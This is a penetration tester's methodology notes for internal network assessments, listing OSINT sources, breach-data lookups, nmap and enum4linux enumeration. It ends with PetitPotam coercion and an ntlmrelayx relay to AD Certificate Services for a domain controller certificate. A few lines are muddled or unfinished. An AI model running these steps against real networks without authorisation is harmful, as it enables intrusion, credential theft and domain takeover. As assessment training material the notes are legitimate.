# Internal Pentesting

**This is done in phases**
#### Phase 0: Initial Enumeration
- Domain information
- Data disclosures
- Breach data
#### Phase 1: In Network
- Initial enumerations uncredentialed in a network
- In Network with Username
- In network with Username and Password
#### Phase 2:On Device
- Low Level User
- Windows Priv Esc
- Admin Low Level
#### Phase 3: Privilege User Access
- Domain Administrator in Network
- Domain Administrator on Host

# Phase 0: OSINT
<details>
  <summary>
    Summary
  </summary>
  The purpose of external recon on day 1 of your internal assessment is to identify information that may help with your attack. This info may include
</details>

1. Domain information
2. Data disclosures
3. Breach data



### Domain Info
#### ASN/IP Registrars
	IANA
	arin
	RIOE
	BGP Toolkit
	Domaintools
	PTRArchive
	ICANN
	Manual
	DNS: Viewdns.info  

### Data Disclosures
<details>
  <summary>
    The Corporate Website
  </summary>
   	We want to see if we can find any information disclosures here that identify user information, internal contact information or anything useful (job postings for technology).
</details>

#### Github
 	https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt, 
	Look for this company specifically, try to find anything associated that may give hint to passwords, keys, secrets, technology or accounts.

### Google Dorking
#### Find emails: 
	intext:'@website.com" inurl:website.com

#### Find files: filetype:
	pdf inurl: website.com

<details>
  <summary>
    Job postings
  </summary>
  Head to glassdoor, indeed, monster, etc. Look for job postings to find roles, technology, software, etc. Look for anything that we could exploit.
</details>

### User Identification/Social Media
#### User Osint to build a list
	https://phonebook.cz
	https://whatsmyname.app/
	https://hunter.io/
#### Social Media
	LinkedIn.com https://github.com/initstring/linkedin2username
	Facebook
	Twitter

### Breached Data
#### Leaked Credentials
	dehashed.com - sudo python3 dehashed.py -q inlanefreight.local -p  
	breach-parse
	HaveIBeenPwned


# Phase 1: In Network
## Initial Enumeration
<details>
  <summary>
    Summary
  </summary>
  We want to find all alive hosts through ping, then NMAP them for all ports. Identify the domain name, located the DC and take screenshots of any web pages.This stage is to identify the network itself. We may also be able to use enum4linux if its misconfigured without credentials.
</details>

### Identify all living hosts
#### FPING Ping the network
	CMD: fping -asgq X.X.X.X/24
Copy this into a text file for NMAP

### Scan all living hosts for ports
	nmap -A  -v  -iL <IP FILE> -oA <EXPORT PATH>
	nmap -sV -sC -Pn X.X.X.X
 Identify everything to review if needed

### (Optional) Identify critical ports (low hanging fruit scan)
	nmap -A -p  21,22,23,25,139,53,80,137, 443,445, 8080, 8443,69 -iL <IP FILE>

### Parse out the data from your NMAP scan
	./Gnmap-Parser.sh --p <nmap file>
 
Run GNMAP-Parser
Run parse function 

### Find the AD/DC
	nmap -p 389,636,53,88 X.X.X.X
	ldapsearch -x -h <ip> -s base
	nmap -n -sV --script"ldap" and not brute -p 389 <DC-IP>

### Take a screenshot of all websites, dont forget for any uncommon ports or 8080,8443
	Eyewitness Port 80,443
	eyewitness --web -f <nmap IP file>
	Subdomain Busting on any internal websites

### Find the Domain
	Crackmapexec smb X.X.X.X

### Find all Hostnames
	Crackmapexec smb X.X.X.X/24

### DNS Zone Transfer
	dig axfr  <Domain_name> @name_server

### Wireshark/ TCP Dump
	sudo tcpdump -i ens224   
<details>
  <summary>
    Summary
  </summary>
  Sitting in the network we can start to pick up some pieces of information by performing a packet capture. We can find other hosts, hostnames, etc. Use TCPdump to capture the traffic and export it to a Wireshark file.
</details>

### Active Directory Enumeration
<details>
  <summary>
    Summary
  </summary>
   If AD is not properly configured, an unauthenticated user can enumerate users, password policies, group memberships, shares and more. We can use this to identify a lot of sensitive information about a network.
</details>

#### Identify AD Information
 	Password Policy1 - enum4linux -P x.x.x.x >> export path  
	 Password Policy2 - crackmapexe <IP> -u "user" -p "password" --pass-pol
	 Groups with members - enum4linux -M x.x.x.x >> export path  
 	Shares Discovery - enum4linux -S x.x.x.x >> export path  
 	Scan for All enum4linux -a X.X.X.X >> ./ADdiscovery.txt

 ### Petipotam
You can attempt this without credentials if its poorly configured
	petitpotam.py <your IP> <DC IP>
If it states connected, successfully bound. Then something went wrong, this was successful. See the exploit in Phase 2: AD Attack techniques

### ADCS Verification (uncredentialed attempt)
	certutil.exe to identify if the domain is using a certificate authority.
Then http://CertificateServer/certsrv

We will run an ntlmrelayx attack against the server
	ntlmrelayx.py -t http://CertificateServer/certsrv -smb2support --adcs --template DomainController
